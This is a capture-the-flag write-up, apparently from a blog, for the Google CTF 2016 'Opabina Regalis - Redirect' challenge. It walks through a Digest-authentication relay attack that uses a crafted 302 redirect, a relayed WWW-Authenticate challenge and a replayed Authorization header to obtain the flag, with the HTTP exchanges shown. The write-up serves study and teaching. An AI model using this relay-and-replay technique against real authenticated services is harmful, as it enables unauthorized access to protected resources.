---
layout: post
title: Google CTF 2016 - Opabina Regalis - Redirect
---
> Following on from Opabina Regalis - Token Fetch, can you get access to the
> ``/protected/secret`` URI?
>
> Listening on port 13001 on
> ``ssl-added-and-removed-here.ctfcompetition.com``.

This challenge also uses protocol buffers. We're using full duplex sockets to
act as both a client and a server on the same connection. When we first connect,
we are sent a request to ``/protected/not-secret``. The goal is to get the
server to send us an authenticated request to ``/protected/secret``, so that we
can send an identical request right back and get an authenticated response.

Initial request from server:

{% highlight http %}
GET /protected/not-secret HTTP/1.1
User-Agent: opabina-regalis.go
{% endhighlight %}

The hash used in Digest auth includes the request URI. If the server gives us a
hash for ``/protected/not-secret``, it won't authorize us to
``/protected/secret``. We'll respond with a 302 redirect response. The server
will make another request, this time for ``/protected/secret``.

{% highlight http %}
GET /protected/secret HTTP/1.1
User-Agent: opabina-regalis.go
{% endhighlight %}

Now we make our own request to ``/protected/secret`` to get the WWW-Authenticate
challenge header.

{% highlight http %}
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Digest realm="In the realm of hackers",qop="auth",nonce="b75493fdbd1f8f81",opaque="b75493fdbd1f8f81"
{% endhighlight %}

Send this exact response at the server (responding to its ``/protected/secret``)
and we should have a valid Authorization header.

{% highlight http %}
GET /protected/secret HTTP/1.1
User-Agent: opabina-regalis.go
Authorization: Digest username="google.ctf",realm="In the realm of hackers",nonce="b75493fdbd1f8f81",uri="/protected/secret",qop="auth",nc=a26312,cnonce="78cd3f62f0ae784e",response="d90872a589d396b0f3fc233c229c8d3b",opaque="b75493fdbd1f8f81"
{% endhighlight %}

Send the exact same request back at the server, and it will auth us.

{% highlight http %}
HTTP/1.1 200 OK
Server: opabina-regalis.go

CTF{Why,do,fungi,have,to,pay,double,bus,fares----because,they,take,up,7oo,Mushroom}
{% endhighlight %}
